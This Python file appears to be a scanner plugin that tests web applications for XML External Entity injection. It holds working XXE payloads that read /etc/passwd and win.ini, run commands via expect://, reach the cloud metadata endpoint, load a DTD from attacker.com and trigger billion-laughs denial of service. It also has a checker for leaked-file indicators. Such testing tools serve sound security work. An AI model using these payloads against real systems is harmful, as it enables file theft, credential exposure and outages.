"""
XXE (XML External Entity) Vulnerability Tester
"""

from typing import List, Dict
from .base_tester import BaseVulnerabilityTester


class XXETester(BaseVulnerabilityTester):
    """Tests for XXE vulnerabilities"""
    
    def get_payloads(self) -> List[str]:
        """Get XXE payloads"""
        return [
            # Basic XXE
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>''',
            
            '''<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>''',
            
            # Windows file
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
<foo>&xxe;</foo>''',
            
            # PHP wrapper
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]>
<foo>&xxe;</foo>''',
            
            # Expect protocol (RCE)
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<foo>&xxe;</foo>''',
            
            # SSRF via XXE
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" >]>
<foo>&xxe;</foo>''',
            
            # XXE with parameter entities
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<foo>&send;</foo>''',
            
            # Billion laughs attack (DoS)
            '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>''',
            
            # XInclude attack
            '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>''',
            
            # SVG XXE
            '''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<text>&xxe;</text>
</svg>''',
            
            # SOAP XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<foo>&xxe;</foo>
</soap:Body>
</soap:Envelope>''',
            
            # DOCTYPE with external DTD
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
<foo>test</foo>''',
            
            # UTF-7 encoded XXE
            '''<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE foo+AFs-+ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI- +AD4-+AF0-+AD4-
+ADw-foo+AD4-+ACY-xxe+ADsAPA-/foo+AD4-''',
        ]
    
    def check_vulnerability(self, response, baseline, payload) -> bool:
        """Check if response indicates XXE vulnerability"""
        if not response or not baseline:
            return False
        
        response_text = response.text.lower()
        
        # File content indicators
        xxe_indicators = [
            # Unix files
            'root:x:0:0',
            '/bin/bash',
            '/etc/passwd',
            
            # Windows files
            '[extensions]',
            '[fonts]',
            'win.ini',
            
            # Cloud metadata
            'ami-id',
            'instance-id',
            'credentials',
            
            # PHP wrapper success
            'base64',
            'pcfet0',  # Base64 encoded <!DO
            
            # Command execution results
            'uid=',
            'gid=',
            
            # XML errors indicating processing
            'xml parsing',
            'entity',
            'external entity',
            'dtd',
            'parser error',
            'xmlparseentityref',
            
            # Memory exhaustion (Billion Laughs)
            'out of memory',
            'memory limit',
            'resource limit',
        ]
        
        for indicator in xxe_indicators:
            if indicator in response_text:
                return True
        
        # Check for error messages
        xxe_errors = [
            'entity',
            'external',
            'dtd',
            'xml',
            'parser',
            'parse error',
            'malformed',
        ]
        
        error_count = sum(1 for error in xxe_errors if error in response_text)
        if error_count >= 2:
            return True
        
        # Check for significant response differences
        if self._response_differs_significantly(response, baseline):
            # Look for XML-specific changes
            if '<?xml' in payload.lower():
                return True
        
        # Check for timeout (DoS attacks like Billion Laughs)
        if hasattr(response, 'elapsed'):
            if response.elapsed.total_seconds() > 30:
                return True
        
        return False
    
    def get_vulnerability_info(self) -> Dict[str, str]:
        """Return XXE vulnerability information"""
        return {
            'name': 'XML External Entity (XXE) Injection',
            'severity': 'critical',
            'description': 'The application is vulnerable to XXE attacks, allowing attackers to access local files, perform SSRF, or cause denial of service.',
            'cwe': 'CWE-611',
            'owasp': 'A05:2021 - Security Misconfiguration',
            'impact': 'Local file disclosure, SSRF attacks, RCE in some cases, and denial of service.',
            'remediation': 'Disable external entity processing in XML parsers, use secure parsers, validate and sanitize XML input.'
        }
